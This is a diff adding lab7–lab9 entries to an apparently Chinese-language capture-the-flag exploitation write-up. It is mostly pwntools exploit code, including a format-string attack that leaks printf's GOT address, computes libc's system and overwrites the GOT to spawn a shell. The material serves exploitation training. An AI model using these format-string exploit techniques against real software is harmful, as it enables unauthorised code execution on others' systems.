@@ -362,3 +362,90 @@ ropper生成的ropchain执行失败，还是使用pwntools辅助生成好些，�
     sl('a'*4+str(rop))
     r.interactive()
 ```
+
+# lab7
+
+```
+    password=0x804a048
+    offset=0x28/4
+
+    ru('?')
+    sl(fmtstr_payload(offset,{password:1}))
+    ru(':')
+    sl('1')
+    r.interactive()
+```
+
+#lab8
+
+同lab7
+
+# lab9
+
+printf 的参数不在栈上了
+可以从两组ebp及其后的返回地址入手,每次修改两个字节,修改为相近的位置。
+
+```
+    def fmtword(prev,word,index):
+        if prev < word :
+            result = word - prev 
+            fmtstr = "%" + str(result) + "c"
+        elif prev == word :
+            result = 0
+        else :
+            result = 0xffff+1 - prev + word 
+            fmtstr = "%" + str(result) + "c"
+        fmtstr += "%" + str(index) + "$hn"
+        #fmtstr += "%" + str(index) + "$p"
+        return fmtstr
+
+    ru('=\n')
+    ru('=\n')
+
+    sl('%6$p%p')#leak ebp2
+    p10_ebp2=int(ru('\n').split('0x')[1],16)
+    info(hex(p10_ebp2))
+
+    p11=p10_ebp2+4
+    p6_ebp1=p10_ebp2-16
+    p7=p6_ebp1+4
+    info(hex(p11))
+    info(hex(p6_ebp1))
+    info(hex(p7))
+
+    #p6_ebp1->p10_ebp2
+    sl(fmtword(0,p7&0xffff,6))
+    #now p10_ebp2->p7
+    ru('\n')
+
+    sl(fmtword(0,elf.got['printf']&0xffff,10))
+    #now p7->printf_got
+    ru('\n')
+
+    #leak printf
+    sl('aaaa%7$s')#not %7$p
+    ru('aaaa')
+    printf_real=u32(rn(4))
+    info(hex(printf_real))
+    ru('\n')
+
+    sl(fmtword(0,p11&0xffff,6))
+    ru('\n')
+    sl(fmtword(0,(elf.got['printf']+2)&0xffff,10))
+    #sl('%11$p%11$p')#check
+    #now p11->printf_got+2
+    ru('\n')
+
+    libc_base=printf_real-libc.symbols['printf']
+    system=libc_base+libc.symbols['system']
+    info('system:'+hex(system))
+    raw_input('continue?')
+    p=fmtword(0,system&0xffff,7)+\
+      fmtword(system&0xffff,(system>>16)&0xffff,11)
+    sl(p)
+    ru('\n')
+
+    sn('sh'+'\00'*100)
+    r.interactive()
+
+```
